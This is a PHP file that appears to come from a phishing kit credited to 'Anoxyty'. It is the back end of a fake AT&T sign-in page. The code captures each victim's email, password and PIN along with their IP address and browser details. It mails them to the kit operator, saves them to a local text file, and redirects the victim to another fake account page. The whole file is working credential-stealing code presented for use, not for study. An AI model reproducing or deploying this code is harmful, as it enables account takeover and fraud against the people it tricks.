<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['email'] ) ) {
		
		$_SESSION['email'] 	  = $_POST['email'];
		$_SESSION['passwrd'] 	  = $_POST['passwrd'];
		$_SESSION['pin'] 	  = $_POST['pin'];
		$code = <<<EOT
============== [ AT&T By Anoxyty | ]🔥 ==============
[EMAIL] 		: {$_SESSION['email']}
[PASSWORD]		: {$_SESSION['passwrd']}
[PIN]		: {$_SESSION['pin']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 AT&T By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 AT&T Email By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <att@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../acctcd?/IAM_OP=login&appName=m10707&loginSuccessURL=/index=signin-notification&ue/mfaidentification");
        exit();
	} else {
		header("Location: ../acctmgmt?&web/auth/#/logon/recognizeUser/confirmation");
		exit();
	}
?>